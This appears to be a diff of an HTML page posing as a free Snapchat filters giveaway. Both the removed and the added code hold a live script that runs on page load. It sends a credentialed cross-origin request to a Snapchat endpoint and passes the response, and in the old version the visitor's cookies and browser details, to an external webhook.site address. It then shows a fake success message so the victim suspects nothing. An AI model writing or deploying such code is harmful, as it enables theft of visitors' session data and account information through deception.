@@ -2,65 +2,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free Snapchat Filters!</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background-color: #f0f0f0;
-      margin-top: 50px;
-    }
-    h1 { color: #fffc00; text-shadow: 2px 2px 4px #000; }
-    p { color: #333; }
-    .loading { display: none; color: #666; }
-  </style>
+  <title>Free Snapchat Goodies!</title>
 </head>
 <body>
-  <h1>Claim Your Free Snapchat Filters!</h1>
-  <p>Processing your free filters...</p>
-  <p class="loading">Please wait a sec!</p>
-
+  <h1>Click for Free Snapchat Goodies!</h1>
   <script>
-    // Error-free fetch to steal Snapchat data
-    fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
-      method: 'POST',
-      credentials: 'include', // Send cookies with the request
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({}) // Safe, valid JSON body
-    })
-    .then(res => {
-      if (!res.ok) throw new Error('Request failed'); // Handle non-200 responses
-      return res.text(); // Get raw response text
-    })
-    .then(data => {
-      // Grab cookies and metadata
-      let cookies = document.cookie || 'No cookies found';
-      let metadata = {
-        responseData: data,
-        cookies: cookies,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent // Bonus: Steal browser info!
-      };
-
-      // Exfiltrate to webhook
-      return fetch('https://webhook.site/b0ef671b-3d52-4098-b811-ca106b19c853?' + new URLSearchParams({
-        data: encodeURIComponent(data),
-        cookies: encodeURIComponent(cookies),
-        metadata: encodeURIComponent(JSON.stringify(metadata))
-      }));
-    })
-    .then(() => {
-      // Show fake success to keep victim happy
-      document.querySelector('p').innerText = 'Success! Check Snapchat for your filters!';
-      document.querySelector('.loading').style.display = 'block';
-    })
-    .catch(error => {
-      // Silent error handling - still looks legit to user
-      console.error('Error:', error);
-      document.querySelector('p').innerText = 'Oops, something went wrong. Try again!';
-    });
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('POST', 'https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', true);
+    req.withCredentials = true; // Send cookies
+    req.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+    req.send('{}'); // Dummy JSON body
+    
+    function reqListener() {
+      // Send stolen data to your webhook
+      var exfil = new XMLHttpRequest();
+      exfil.open('GET', 'https://webhook.site/b0ef671b-3d52-4098-b811-ca106b19c853?data=' + encodeURIComponent(this.responseText), true);
+      exfil.send();
+      // Optional: Show fake success to keep the user happy
+      document.body.innerHTML += '<p>Success! Check your Snapchat!</p>';
+    }
   </script>
 </body>
 </html>
